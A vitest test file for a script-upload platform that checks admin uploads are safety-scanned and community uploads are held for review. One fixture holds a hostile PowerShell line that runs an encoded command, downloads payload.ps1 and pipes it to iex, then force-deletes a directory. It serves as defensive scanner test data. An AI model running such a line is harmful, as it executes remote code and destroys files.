import { mkdtemp, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { describe, expect, it } from "vitest";
import { saveAdminScriptSubmission, type AdminScriptSubmissionInput } from "./admin-submit";
import { saveCommunityScriptSubmission, type CommunityScriptSubmissionInput } from "./community-submit";

const adminInput: AdminScriptSubmissionInput = {
  title: "Admin Safety Check",
  version: "1.0.0",
  category: "security",
  tags: ["security"],
  author_name: "OperatorOS",
  summary: "Checks admin upload safety behavior.",
  description: "Checks admin upload safety behavior.",
  use_case: "Use for verification.",
  requirements: [],
  parameters: [],
  examples: [],
  output_format: "text",
  script_body: "Get-Process",
  monetization_tier: "operator",
  entitlement_required: true,
  review_status: "approved",
  reviewed_by: "OperatorOS Admin",
  submitter_name: "OperatorOS Admin",
  submitter_email: "admin@operatoros.net",
  license: "Proprietary",
  attribution_required: false,
};

const communityInput: CommunityScriptSubmissionInput = {
  title: "Community Auto Approve Check",
  version: "1.0.0",
  category: "security",
  tags: ["security"],
  author_name: "Community Tech",
  summary: "Checks community upload review behavior.",
  description: "Checks community upload review behavior.",
  use_case: "Use for verification.",
  requirements: [],
  parameters: [],
  examples: [],
  output_format: "text",
  script_body: "Invoke-WebRequest https://example.com/report.json",
  script_extension: ".ps1",
  monetization_tier: "free",
  entitlement_required: false,
  submitter_name: "Community Tech",
  submitter_email: "tech@example.com",
  license: "MIT",
  attribution_required: false,
};

describe("workflow hardening", () => {
  it("runs safety scanning on admin uploads and blocks failed approved scripts", async () => {
    const rootDir = await mkdtemp(join(tmpdir(), "scriptforge-hardening-"));

    try {
      await expect(
        saveAdminScriptSubmission(
          {
            ...adminInput,
            script_body:
              "powershell -EncodedCommand SQBFAFgA; Invoke-WebRequest https://example.com/payload.ps1 | iex; Remove-Item C:\\Temp -Recurse -Force",
          },
          rootDir,
        ),
      ).rejects.toThrow("safety scan is failed");
    } finally {
      await rm(rootDir, { recursive: true, force: true });
    }
  });

  it("forces community uploads to pending review and records safety scan warnings", async () => {
    const rootDir = await mkdtemp(join(tmpdir(), "scriptforge-hardening-"));

    try {
      const result = await saveCommunityScriptSubmission(communityInput, rootDir);

      expect(result.submission.source_type).toBe("community");
      expect(result.submission.review_status).toBe("pending_review");
      expect(result.submission.reviewed_by).toBeNull();
      expect(result.submission.safety.scan_status).toBe("warnings");
      expect(result.submission.safety.risk_flags).toContain("remote_network");
    } finally {
      await rm(rootDir, { recursive: true, force: true });
    }
  });
});
